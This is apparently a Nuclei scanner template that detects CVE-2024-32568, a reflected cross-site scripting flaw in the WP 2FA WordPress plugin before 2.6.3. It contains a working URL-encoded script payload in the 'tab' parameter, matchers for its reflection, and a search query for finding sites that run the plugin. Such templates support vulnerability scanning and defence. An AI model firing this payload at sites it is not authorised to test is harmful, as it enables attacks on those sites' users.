id: CVE-2024-32568

info:
  name: WP 2FA < 2.6.3 - Reflected Cross-Site Scripting
  author: intelligent-ears
  severity: medium
  description: |
    The WP 2FA plugin for WordPress is vulnerable to Reflected Cross-Site Scripting
    in versions up to and including 2.6.2 due to insufficient input sanitization and
    output escaping on the 'tab' parameter. This makes it possible for unauthenticated
    attackers to inject arbitrary web scripts that execute if they can successfully
    trick a user into performing an action such as clicking on a link.
  reference:
    - https://www.wordfence.com/threat-intel/vulnerabilities/id/8620d181-22f9-4054-9d5c-1b26a315d10c
    - https://plugins.trac.wordpress.org/changeset/3036029/wp-2fa
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
    cve-id: CVE-2024-32568
  metadata:
    verified: true
    max-request: 2
    publicwww-query: "/wp-content/plugins/wp-2fa/"
  tags: cve,cve2024,wordpress,wp-plugin,xss,wp-2fa

http:
  - method: GET
    path:
      - "{{BaseURL}}/wp-admin/admin.php?page=wp-2fa-help-contact-us&tab=%22%3E%3Cscript%3Ealert(1)%3C/script%3E"

    redirects: true
    max-redirects: 3
    matchers-condition: or

    matchers:
      - type: word
        name: xss-reflected-in-body
        part: body
        words:
          - "alert(1)"
        case-insensitive: true

      - type: regex
        name: xss-in-hidden-field
        part: body
        regex:
          - 'value="[^"]*tab=%22%3E%3Cscript%3Ealert\(1\)%3C/script%3E[^"]*"'
          - 'value="[^"]*alert\(1\)[^"]*"'
